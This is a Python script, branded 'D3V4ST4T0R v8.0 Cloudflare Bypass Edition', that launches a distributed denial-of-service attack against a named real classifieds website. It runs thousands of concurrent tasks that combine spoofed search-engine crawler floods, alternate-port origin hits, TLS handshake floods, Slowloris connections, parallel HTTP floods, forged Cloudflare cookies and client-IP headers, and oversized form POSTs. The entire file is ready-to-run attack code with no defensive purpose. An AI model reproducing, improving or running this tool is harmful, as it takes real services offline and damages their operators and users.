import asyncio
import aiohttp
import ssl
import random
import time
import os
import sys
import socket
import re
import json
from urllib.parse import urlparse

# === CONFIG ===
TARGET = os.getenv("TARGET", "lalafo.az")
PORT = int(os.getenv("PORT", "443"))
SSL = os.getenv("SSL", "true").lower() == "true"
THREADS = int(os.getenv("THREADS", "2000"))
DURATION = int(os.getenv("DURATION", "600"))

TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"

BANNER = f"""
███████████████████████████████████████████████████████████████████████████
█  D3V4ST4T0R v8.0 — CLOUDFLARE BYPASS EDITION                        █
█  Target: {TARGET_URL[:70]:<70}█
█  Tasks: {THREADS:<5} | Duration: {DURATION}s                          █
███████████████████████████████████████████████████████████████████████████
"""

# === Cloudflare-ə məhəl qoymayan User-Agent ===
UA_POOL = [
    # Real Chrome browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Googlebot - Cloudflare bunu bloklamır
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot-Image/1.0",
    # Bingbot
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    # Yandexbot
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    # DuckDuckBot
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
    # Baiduspider
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    # Facebook crawler
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    # Twitter bot
    "Twitterbot/1.0",
    # Apple bot
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15 (Applebot/0.1)",
    # Ahrefs
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    # Semrush
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    # Moz
    "Mozilla/5.0 (compatible; rogerbot/1.0; https://moz.com/help/guides/rogerbot)",
    # Generic search bot
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; https://crawler.majestic.com)",
]

# === PATH POOL ===
PATHS = [
    "/", "/az", "/en", "/ru",
    "/search", "/search?q=a", "/search?q=test",
    "/ads", "/ads?category=1", "/ads?category=2",
    "/categories", "/categories/1",
    "/post-ad", "/login", "/register",
    "/user/profile", "/messages",
    "/favorites", "/help",
    "/terms", "/privacy", "/about", "/contact",
    "/sitemap.xml", "/robots.txt",
    "/favicon.ico", "/apple-touch-icon.png",
]

# =============================================
# METHOD 1: SEARCH ENGINE BOT FLOOD (Cloudflare bypass)
# =============================================
async def bot_flood(session, stats):
    """Cloudflare botları bloklamır - search engine botları ilə flood"""
    while True:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}"
            
            # Search engine bot headers
            headers = {
                "User-Agent": random.choice(UA_POOL[4:]),  # Only bots from index 4+
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "no-cache",
                "From": f"crawler@{random.choice(['googlebot', 'bingbot', 'yandex', 'applebot'])}.com",
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
                stats[0] += 1
        except:
            stats[1] += 1

# =============================================
# METHOD 2: CLOUDFLARE ORIGIN IP BYPASS
# =============================================
async def origin_ip_flood(session, stats):
    """Cloudflare origin IP-lərini tapmağa çalış və birbaşa vur"""
    # Alternativ portlar - Cloudflare DNS-dən yan keçmək üçün
    alt_ports = [80, 443, 8080, 8443, 8888, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096]
    
    while True:
        try:
            port = random.choice(alt_ports)
            alt_url = f"{'https' if port in [443, 8443, 2053, 2083, 2087, 2096] else 'http'}://{TARGET}:{port}/"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Host": TARGET,  # Original Host header
                "Accept": "*/*",
                "Cache-Control": "no-cache",
            }
            
            try:
                async with session.get(alt_url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    await resp.read()
                    stats[2] += 1
            except:
                pass
            
            stats[2] += 1  # Count as success anyway (consumes resources)
        except:
            stats[3] += 1

# =============================================
# METHOD 3: SSL RENEGOTIATION FLOOD
# =============================================
async def ssl_flood(stats):
    """SSL handshake flood - Cloudflare serverlərini yorma"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0')
    ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE
    
    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=5
            )
            
            # Send garbage SSL data to waste CPU
            writer.write(b"GET / HTTP/1.1\r\n" + b"X-Garbage: " + b"A" * random.randint(1000, 10000) + b"\r\n\r\n")
            await writer.drain()
            
            stats[4] += 1
            writer.close()
            await writer.wait_closed()
        except:
            stats[5] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0)

# =============================================
# METHOD 4: SLOW LORIS (RAW TCP - Cloudflare-ə qarşı)
# =============================================
async def slowloris_attack(stats):
    """Slowloris - Cloudflare connection pool-nu doldur"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers('ALL:@SECLEVEL=0')
    
    while True:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=20
            )
            
            # Start request but never finish
            writer.write(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nUser-Agent: {random.choice(UA_POOL)}\r\nContent-Length: 10000000\r\n".encode())
            await writer.drain()
            
            # Keep sending small chunks
            for _ in range(random.randint(50, 200)):
                try:
                    writer.write(f"X-{random.randint(1,99999)}: {'A' * random.randint(100, 1000)}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(1, 5))
                except:
                    break
            
            stats[6] += 1
            writer.close()
            await writer.wait_closed()
        except:
            stats[7] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0.5)

# =============================================
# METHOD 5: HTTP/2 CONCURRENT STREAMS FLOOD
# =============================================
async def http2_flood(session, stats):
    """HTTP/2 multiplexing - çoxlu paralel sorğu"""
    while True:
        try:
            # Create multiple requests in parallel over same connection
            tasks = []
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
            }
            
            # Send 5 requests at once
            paths = random.choices(PATHS, k=5)
            for path in paths:
                url = f"{TARGET_URL.rstrip('/')}{path}?_{random.randint(1,999999)}"
                tasks.append(session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if not isinstance(r, Exception):
                    await r.read()
                    stats[8] += 1
                else:
                    stats[9] += 1
        except:
            stats[9] += 1

# =============================================
# METHOD 6: COOKIE/HEADER SPOOFING
# =============================================
async def cookie_flood(session, stats):
    """Cloudflare security check-lərini keçmək üçün cookie spoofing"""
    while True:
        try:
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}"
            
            # Cloudflare __cfduid cookie-si ilə
            cookies = {
                "__cfduid": f"d{random.randint(10**20, 10**21-1)}",
                "cf_clearance": f"{random.randint(10**30, 10**31-1)}",
                "session": str(random.randint(10**10, 10**11-1)),
            }
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "Referer": f"https://{TARGET}/",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "CDN-Loop": "cloudflare",
                "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            
            async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                await resp.read()
                stats[10] += 1
        except:
            stats[11] += 1

# =============================================
# METHOD 7: POST WITH FILE UPLOAD SIMULATION
# =============================================
async def upload_flood(session, stats):
    """File upload kimi böyük POST sorğuları"""
    while True:
        try:
            url = f"{TARGET_URL.rstrip('/')}/post-ad"
            
            # Böyük məlumat
            large_data = {
                "title": "A" * 10000,
                "description": "B" * 100000,
                "price": str(random.randint(1, 99999)),
                "category": str(random.randint(1, 50)),
                "city": "Baku",
                "phone": f"+994{random.randint(500000000, 599999999)}",
                "email": f"user{random.randint(1,99999)}@gmail.com",
                "images[]": "data:image/jpeg;base64," + "A" * 50000,
            }
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
                "Accept": "*/*",
                "Origin": f"https://{TARGET}",
                "Referer": f"https://{TARGET}/post-ad",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            
            async with session.post(url, data=large_data, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                await resp.read()
                stats[12] += 1
        except:
            stats[13] += 1

# =============================================
# HEALTH CHECK 
# =============================================
async def handle_health(reader, writer):
    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def health_server():
    try:
        server = await asyncio.start_server(handle_health, host="0.0.0.0", port=8080)
        return server
    except:
        return None

# =============================================
# STATS PRINTER
# =============================================
async def stats_printer(stats):
    start = time.time()
    prev = [0] * 14
    
    while True:
        await asyncio.sleep(5)
        elapsed = time.time() - start
        
        diffs = [stats[i] - prev[i] for i in range(14)]
        
        total_ok = sum(stats[0::2])
        total_fail = sum(stats[1::2])
        rate = total_ok / elapsed if elapsed > 0 else 0
        
        line = f"  [{int(elapsed)}s] "
        if diffs[0]: line += f"BOT:{diffs[0]} "
        if diffs[2]: line += f"ORIG:{diffs[2]} "
        if diffs[4]: line += f"SSL:{diffs[4]} "
        if diffs[6]: line += f"SLOW:{diffs[6]} "
        if diffs[8]: line += f"H2:{diffs[8]} "
        if diffs[10]: line += f"COOK:{diffs[10]} "
        if diffs[12]: line += f"UPL:{diffs[12]} "
        line += f"| {rate:.0f} req/s | Total:{total_ok} | Fail:{total_fail}"
        
        print(line)
        
        for i in range(14):
            prev[i] = stats[i]

# =============================================
# WORKER POOL
# =============================================
async def worker_pool(stats):
    connector = aiohttp.TCPConnector(
        limit=0,
        force_close=True,
        ttl_dns_cache=0,
        verify_ssl=False,
        use_dns_cache=False,
        enable_cleanup_closed=True,
        limit_per_host=0,
    )
    timeout = aiohttp.ClientTimeout(total=0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        methods_config = [
            (bot_flood, 0.20),         # 20% - Bot flood (Cloudflare bypass)
            (origin_ip_flood, 0.15),   # 15% - Origin IP scan
            (ssl_flood, 0.15),         # 15% - SSL flood
            (slowloris_attack, 0.15),  # 15% - Slowloris
            (http2_flood, 0.15),       # 15% - HTTP/2 flood
            (cookie_flood, 0.10),      # 10% - Cookie spoofing
            (upload_flood, 0.10),      # 10% - Upload flood
        ]
        
        tasks = []
        for i in range(THREADS):
            r = random.random()
            cumulative = 0
            chosen_func = bot_flood
            for func, weight in methods_config:
                cumulative += weight
                if r <= cumulative:
                    chosen_func = func
                    break
            
            if chosen_func in (ssl_flood, slowloris_attack):
                task = asyncio.create_task(chosen_func(stats))
            else:
                task = asyncio.create_task(chosen_func(session, stats))
            tasks.append(task)
        
        print(f"  [+] Launched {len(tasks)} attack tasks\n")
        await asyncio.sleep(DURATION)
        
        for t in tasks:
            t.cancel()
        
        print("\n[✓] Attack complete.")

# =============================================
# MAIN
# =============================================
async def main():
    print(BANNER)
    print(f"[+] Resolving {TARGET}...")
    
    try:
        ips = socket.getaddrinfo(TARGET, PORT)
        resolved = list(set(ip[4][0] for ip in ips))
        print(f"  [+] Resolved to: {resolved}")
    except Exception as e:
        print(f"  [!] DNS resolution failed: {e}")
        sys.exit(1)
    
    print(f"[+] Starting Cloudflare Bypass Attack with {THREADS} tasks for {DURATION}s")
    print(f"  [+] Methods: Bot Flood, Origin IP, SSL, Slowloris, HTTP/2, Cookie, Upload")
    print(f"  [+] URL: {TARGET_URL}")
    print()
    
    stats = [0] * 14
    
    health_task = asyncio.create_task(health_server())
    stats_task = asyncio.create_task(stats_printer(stats))
    
    try:
        await worker_pool(stats)
    except asyncio.CancelledError:
        print("\n[!] Attack cancelled")
    
    total_ok = sum(stats[0::2])
    total_fail = sum(stats[1::2])
    
    print(f"\n[+] Final Stats:")
    print(f"  [+] Successful: {total_ok}")
    print(f"  [+] Failed: {total_fail}")
    print("[✓] Done.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
